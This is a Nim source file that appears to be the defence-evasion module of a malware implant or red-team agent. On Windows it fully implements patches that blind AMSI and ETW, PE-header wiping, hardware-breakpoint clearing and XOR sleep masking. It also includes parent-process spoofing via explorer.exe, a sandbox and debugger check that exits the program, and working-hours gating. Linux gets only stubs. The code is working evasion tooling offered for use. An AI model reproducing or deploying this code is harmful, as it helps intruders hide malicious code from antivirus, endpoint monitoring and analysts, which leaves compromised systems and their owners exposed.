## OPSEC evasion: AMSI, ETW, sleep mask, PE header wipe, HWBP clear, PPID spoof,
## sandbox detection, working-hours gating.
## Windows: full implementation.  Linux: portable stubs.

when defined(windows):
  import winim/lean, winim/inc/tlhelp32
  import std/[os, strutils, random]
  import config
  import ./syscalls
  import ./api_hash

  # ── Byte patching helper ──────────────────────────────────────────────────────
  proc patchBytes(address: LPVOID; patch: openArray[byte]) =
    var oldProt: DWORD
    # VirtualProtect resolved via PEB walk — no IAT entry
    discard callVirtualProtect(address, SIZE_T(patch.len),
                               PAGE_EXECUTE_READWRITE, addr oldProt)
    copyMem(address, unsafeAddr patch[0], patch.len)
    discard callVirtualProtect(address, SIZE_T(patch.len), oldProt, addr oldProt)

  # ── AMSI ──────────────────────────────────────────────────────────────────────
  proc patchAMSI*() =
    let amsi = LoadLibraryA("amsi.dll")
    if amsi == 0: return
    let fn = GetProcAddress(amsi, "AmsiScanBuffer")
    if fn == nil: return
    patchBytes(fn, [byte 0x33, 0xC0, 0xC3])

  # ── ETW ───────────────────────────────────────────────────────────────────────
  proc patchETW*() =
    let ntdll = GetModuleHandleA("ntdll.dll")
    if ntdll == 0: return
    let fn = GetProcAddress(ntdll, "EtwEventWrite")
    if fn == nil: return
    patchBytes(fn, [byte 0x33, 0xC0, 0xC3])

  proc disableETWProcess*() =
    let ntdll = GetModuleHandleA("ntdll.dll")
    if ntdll == 0: return
    type FnT = proc(h: HANDLE; cls: ULONG; info: pointer; sz: ULONG): NTSTATUS {.stdcall.}
    let fn = cast[FnT](GetProcAddress(ntdll, "NtSetInformationProcess"))
    if fn == nil: return
    var flag: ULONG = 0
    discard fn(HANDLE(-1), 87, addr flag, sizeof(flag).ULONG)

  # ── Wipe MZ signature ─────────────────────────────────────────────────────────
  proc wipeMZHeader*() =
    let base = GetModuleHandleW(nil)
    if base == 0: return
    var old: DWORD
    discard VirtualProtect(cast[LPVOID](base), 2, PAGE_READWRITE, addr old)
    cast[ptr byte](base)[] = 0
    cast[ptr byte](base + 1)[] = 0
    discard VirtualProtect(cast[LPVOID](base), 2, old, addr old)

  # ── Hardware breakpoint clear ─────────────────────────────────────────────────
  proc clearHWBP*() =
    # OpenThread/GetThreadContext/SetThreadContext/CloseHandle resolved via
    # PEB walk — none of these appear in the IAT.
    let h = callOpenThread(THREAD_GET_CONTEXT or THREAD_SET_CONTEXT,
                           WINBOOL(0), GetCurrentThreadId())
    if h == 0: return
    defer: discard callCloseHandle(h)
    var ctx: CONTEXT
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
    if callGetThreadContext(h, addr ctx) == 0: return
    ctx.Dr0 = 0; ctx.Dr1 = 0; ctx.Dr2 = 0; ctx.Dr3 = 0
    ctx.Dr6 = 0; ctx.Dr7 = 0
    discard callSetThreadContext(h, addr ctx)

  # ── Sleep masking (XOR encrypt non-exec PE sections during sleep) ─────────────
  const XOR_SLEEP_KEY: byte = 0xA7

  proc sleepMasked*(ms: int) =
    if ms <= 0: return
    when defined(noSleepMask):
      Sleep(DWORD(ms)); return

    let base = GetModuleHandleW(nil)
    if base == 0:
      sleepViaNt(ms)
      return

    let dos = cast[ptr IMAGE_DOS_HEADER](base)
    let nt  = cast[PIMAGE_NT_HEADERS](cast[int](base) + dos.e_lfanew)
    let nsec = int(nt.FileHeader.NumberOfSections)
    let firstSec = IMAGE_FIRST_SECTION(nt)

    proc shouldMask(sh: ptr IMAGE_SECTION_HEADER): bool {.inline.} =
      if sh.SizeOfRawData == 0: return false
      if (sh.Characteristics and DWORD(IMAGE_SCN_MEM_EXECUTE)) != 0: return false
      let nm = cast[ptr UncheckedArray[byte]](addr sh.Name[0])
      if nm[0] == byte('.') and nm[1] == byte('i') and nm[2] == byte('d'): return false
      return true

    for i in 0 ..< nsec:
      let sh = cast[ptr IMAGE_SECTION_HEADER](cast[int](firstSec) + i * sizeof(IMAGE_SECTION_HEADER))
      if not shouldMask(sh): continue
      let secAddr = cast[ptr UncheckedArray[byte]](cast[int](base) + sh.VirtualAddress.int)
      let size    = sh.SizeOfRawData.int
      var old: DWORD
      discard VirtualProtect(cast[LPVOID](secAddr), SIZE_T(size), PAGE_READWRITE, addr old)
      for j in 0 ..< size: secAddr[j] = secAddr[j] xor XOR_SLEEP_KEY
      discard VirtualProtect(cast[LPVOID](secAddr), SIZE_T(size), PAGE_READONLY, addr old)

    Sleep(DWORD(ms))

    for i in 0 ..< nsec:
      let sh = cast[ptr IMAGE_SECTION_HEADER](cast[int](firstSec) + i * sizeof(IMAGE_SECTION_HEADER))
      if not shouldMask(sh): continue
      let secAddr = cast[ptr UncheckedArray[byte]](cast[int](base) + sh.VirtualAddress.int)
      let size    = sh.SizeOfRawData.int
      var old: DWORD
      discard VirtualProtect(cast[LPVOID](secAddr), SIZE_T(size), PAGE_READWRITE, addr old)
      for j in 0 ..< size: secAddr[j] = secAddr[j] xor XOR_SLEEP_KEY
      let origProt: DWORD = if (sh.Characteristics and DWORD(IMAGE_SCN_MEM_WRITE)) != 0:
                              DWORD(PAGE_READWRITE)
                            else:
                              DWORD(PAGE_READONLY)
      discard VirtualProtect(cast[LPVOID](secAddr), SIZE_T(size), origProt, addr old)

  # ── PPID spoofing for child processes ─────────────────────────────────────────
  const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS* = DWORD_PTR(0x00020000)

  proc spawnWithPPID*(cmd: string; ppidProc: string = "explorer.exe"): bool =
    var parentPid: DWORD = 0
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == INVALID_HANDLE_VALUE: return false
    defer: discard CloseHandle(snap)

    var pe: PROCESSENTRY32W
    pe.dwSize = sizeof(pe).DWORD
    if Process32FirstW(snap, addr pe).bool:
      while true:
        let name = $cast[WideCString](addr pe.szExeFile[0])
        if name.toLowerAscii() == ppidProc.toLowerAscii():
          parentPid = pe.th32ProcessID
          break
        if not Process32NextW(snap, addr pe).bool: break

    if parentPid == 0: return false

    let hParent = OpenProcess(PROCESS_CREATE_PROCESS, 0, parentPid)
    if hParent == 0: return false
    defer: discard CloseHandle(hParent)

    var siEx: STARTUPINFOEXW
    siEx.StartupInfo.cb = sizeof(siEx).DWORD
    var attrSize: SIZE_T
    discard InitializeProcThreadAttributeList(nil, 1, 0, addr attrSize)
    let attrList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, attrSize))
    defer: HeapFree(GetProcessHeap(), 0, attrList)
    discard InitializeProcThreadAttributeList(attrList, 1, 0, addr attrSize)
    discard UpdateProcThreadAttribute(attrList, 0,
      PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
      addr hParent, sizeof(hParent).SIZE_T, nil, nil)
    siEx.lpAttributeList = attrList

    var pi: PROCESS_INFORMATION
    let cmdW = newWideCString(cmd)
    let r = CreateProcessW(nil, cmdW, nil, nil, 0,
      CREATE_SUSPENDED or EXTENDED_STARTUPINFO_PRESENT,
      nil, nil, addr siEx.StartupInfo, addr pi)
    DeleteProcThreadAttributeList(attrList)
    if not r.bool: return false

    discard ResumeThread(pi.hThread)
    discard CloseHandle(pi.hThread)
    discard CloseHandle(pi.hProcess)
    return true

  # ── Sandbox / analysis environment detection ──────────────────────────────────
  proc sandboxCheck*() =
    if IsDebuggerPresent() != 0: ExitProcess(0)
    var score = 0
    var si: SYSTEM_INFO
    GetSystemInfo(addr si)
    if si.dwNumberOfProcessors < 2: inc score
    var ms: MEMORYSTATUSEX
    ms.dwLength = sizeof(ms).DWORD
    if GlobalMemoryStatusEx(addr ms) != 0:
      if ms.ullTotalPhys < DWORDLONG(512 * 1024 * 1024): score += 3
      elif ms.ullTotalPhys < DWORDLONG(1024 * 1024 * 1024): inc score
    var totalBytes: ULONGLONG = 0
    discard GetDiskFreeSpaceExW(newWideCString("C:\\"), nil,
      cast[PULARGE_INTEGER](addr totalBytes), nil)
    if totalBytes > 0 and totalBytes < ULONGLONG(40) * 1024 * 1024 * 1024: inc score
    var ubuf = newWideCString(newString(256))
    if GetEnvironmentVariableW(newWideCString("USERNAME"), ubuf, 256) > 0:
      let uname = ($ubuf).toLowerAscii()
      for s in ["sandbox", "malware", "virus", "analyst", "cuckoo", "maltest", "vmuser"]:
        if s in uname: score += 3; break
    if score >= 4: ExitProcess(0)

  # ── Working-hours gating ──────────────────────────────────────────────────────
  var workingHoursDyn* = WorkingHours

  proc inWorkingHours*(): bool =
    if workingHoursDyn == "": return true
    let idx = workingHoursDyn.find('-')
    if idx < 1: return true
    let sp = workingHoursDyn[0..<idx].split(':')
    let ep = workingHoursDyn[idx+1..^1].split(':')
    if sp.len != 2 or ep.len != 2: return true
    var sh, sm, eh, em: int
    try:
      sh = parseInt(sp[0]); sm = parseInt(sp[1])
      eh = parseInt(ep[0]); em = parseInt(ep[1])
    except: return true
    var st: SYSTEMTIME
    GetLocalTime(addr st)
    let cur = int(st.wHour) * 60 + int(st.wMinute)
    let s = sh * 60 + sm
    let e = eh * 60 + em
    if s <= e: return cur >= s and cur < e
    else: return cur >= s or cur < e

  proc sleepUntilWorkHours*() =
    if workingHoursDyn == "": return
    let idx = workingHoursDyn.find('-')
    if idx < 1: return
    let sp = workingHoursDyn[0..<idx].split(':')
    if sp.len != 2: return
    var sh, sm: int
    try: sh = parseInt(sp[0]); sm = parseInt(sp[1])
    except: return
    var st: SYSTEMTIME
    GetLocalTime(addr st)
    let cur = int(st.wHour) * 60 + int(st.wMinute)
    let s = sh * 60 + sm
    let waitMin = if cur < s: s - cur else: (24 * 60 - cur) + s
    if waitMin > 0: sleepMasked(waitMin * 60 * 1000)

  # ── Memory scrambler daemon (MEM_FLUCTUATE) ───────────────────────────────────
  const SCRAMBLE_KEY: byte = 0xA7
  var gScramblerStop: bool = false
  var gScramblerThread: Thread[int]
  var gScramblerRunning: bool = false
  # 4 KB decoy buffer that gets XOR-mutated on each tick
  var gScramblerBuf: array[4096, byte]

  proc scramblerThreadProc(intervalMs: int) {.thread.} =
    var encrypted = false
    while not gScramblerStop:
      Sleep(DWORD(intervalMs))
      if gScramblerStop: break
      for i in 0..<gScramblerBuf.len:
        gScramblerBuf[i] = gScramblerBuf[i] xor SCRAMBLE_KEY
      encrypted = not encrypted
    # Restore on exit
    if encrypted:
      for i in 0..<gScramblerBuf.len:
        gScramblerBuf[i] = gScramblerBuf[i] xor SCRAMBLE_KEY

  proc stopMemFluctuate*() =
    if not gScramblerRunning: return
    gScramblerStop = true
    joinThread(gScramblerThread)
    gScramblerRunning = false
    gScramblerStop = false

  proc startMemFluctuate*(intervalSec: int) =
    stopMemFluctuate()
    let ms = max(1, intervalSec) * 1000
    gScramblerStop = false
    createThread(gScramblerThread, scramblerThreadProc, ms)
    gScramblerRunning = true

  # ── Apply all evasion at startup ──────────────────────────────────────────────
  proc applyEvasion*() =
    when defined(SandboxChecks):
      sandboxCheck()
    patchAMSI()
    patchETW()
    disableETWProcess()

else:
  # ── Linux stubs ───────────────────────────────────────────────────────────────
  import std/[os, strutils, times]
  import config

  var workingHoursDyn* = WorkingHours

  proc sleepMasked*(ms: int) = os.sleep(ms)

  proc inWorkingHours*(): bool =
    if workingHoursDyn == "": return true
    let idx = workingHoursDyn.find('-')
    if idx < 1: return true
    let sp = workingHoursDyn[0..<idx].split(':')
    let ep = workingHoursDyn[idx+1..^1].split(':')
    if sp.len != 2 or ep.len != 2: return true
    try:
      let sh = parseInt(sp[0]); let sm = parseInt(sp[1])
      let eh = parseInt(ep[0]); let em = parseInt(ep[1])
      let t  = times.now()
      let cur = t.hour * 60 + t.minute
      let s = sh * 60 + sm
      let e = eh * 60 + em
      if s <= e: return cur >= s and cur < e
      else: return cur >= s or cur < e
    except: return true

  proc sleepUntilWorkHours*() =
    if workingHoursDyn == "": return
    let idx = workingHoursDyn.find('-')
    if idx < 1: return
    let sp = workingHoursDyn[0..<idx].split(':')
    if sp.len != 2: return
    try:
      let sh = parseInt(sp[0]); let sm = parseInt(sp[1])
      let t  = times.now()
      let cur = t.hour * 60 + t.minute
      let s = sh * 60 + sm
      let waitMin = if cur < s: s - cur else: (24 * 60 - cur) + s
      if waitMin > 0: sleepMasked(waitMin * 60 * 1000)
    except: discard

  proc applyEvasion*()   = discard
  proc wipeMZHeader*()   = discard
  proc clearHWBP*()      = discard
  proc spawnWithPPID*(cmd: string; ppidProc: string = "explorer.exe"): bool = false
  proc startMemFluctuate*(intervalSec: int) = discard
  proc stopMemFluctuate*()                  = discard
